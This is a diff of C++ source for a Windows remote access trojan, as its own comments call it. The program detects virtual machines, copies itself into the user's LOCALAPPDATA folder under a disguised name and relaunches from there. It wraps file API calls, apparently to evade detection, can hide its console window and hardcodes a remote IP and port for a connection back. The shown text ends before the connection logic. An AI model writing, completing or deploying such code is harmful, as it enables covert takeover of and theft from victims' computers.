@@ -1,7 +1,12 @@
+#define WIN32_LEAN_AND_MEAN
+
 #include <iostream>
 #include <intrin.h>
 #include "Connection.h"
+#include "Functions.h"
 
+
+Functions *functions = new Functions();
 
 //Check if the software running on VM
 bool vmCheck() {
@@ -12,7 +17,7 @@ bool vmCheck() {
     return ((info[2] >> 31) == 1); //if its 1 so the exe running on vm if not so its running on physical machine
 }
 
-//Creating a new same RAT in C:\\C_projects\\WindowSys.exe
+//Creating a new same RAT in C:\\C_projects\\test001.exe
 bool moveFilePlace() {
     TCHAR szExeFileName[MAX_PATH];
     ::GetModuleFileNameA(NULL, szExeFileName, MAX_PATH);
@@ -22,9 +27,9 @@ bool moveFilePlace() {
     }
 
     string path = getenv("LOCALAPPDATA");
-    path += "\\WindowSys.exe";
+    path += "\\test001.exe";
 
-    if (!fileName.rfind("WindowSys.exe")) {
+    if (!fileName.rfind("test001.exe")) {
         return false;
     }
 
@@ -50,8 +55,8 @@ bool moveFilePlace() {
     vector<char> buffer(BUFFER_SIZE + 1, 0);
     DWORD bytesRead = sizeof(bytesRead);
     while (bytesRead != 0) {
-        ::ReadFile(hFileRead, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
-        ::WriteFile(hFileWrite, buffer.data(), bytesRead, NULL, NULL);
+        functions->ReadFile_Function(hFileRead, buffer.data(), BUFFER_SIZE, &bytesRead, NULL);
+        functions->WriteFile_Function(hFileWrite, buffer.data(), bytesRead, NULL, NULL);
     }
     CloseHandle(hFileWrite);
     CloseHandle(hFileRead);
@@ -59,14 +64,16 @@ bool moveFilePlace() {
 }
 
 int main() {
-    //Checking if the file WindowSys.exe is exist
-    if (moveFilePlace()) {
+    //functions->Sleep_Function(5000);
+
+    //Checking if the file test001.exe is exist
+    if (!moveFilePlace()) {
         string path = getenv("LOCALAPPDATA");
-        cout << "The command is " << "cd " + path + "&& start WindowSys.exe" << endl;
-        system(("cd " + path + "&& start WindowSys.exe").c_str());
+        cout << "The command is " << "cd " + path + "&& start test001.exe" << endl;
+        system(("cd " + path + "&& start test001.exe").c_str());
         return 0;
     } else {
-        ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+        //::ShowWindow(::GetConsoleWindow(), SW_SHOW);fdsafdsafdsaf
         string ip = "141.226.121.68";
         //string ip = "192.168.1.210";
         int port = 9087;
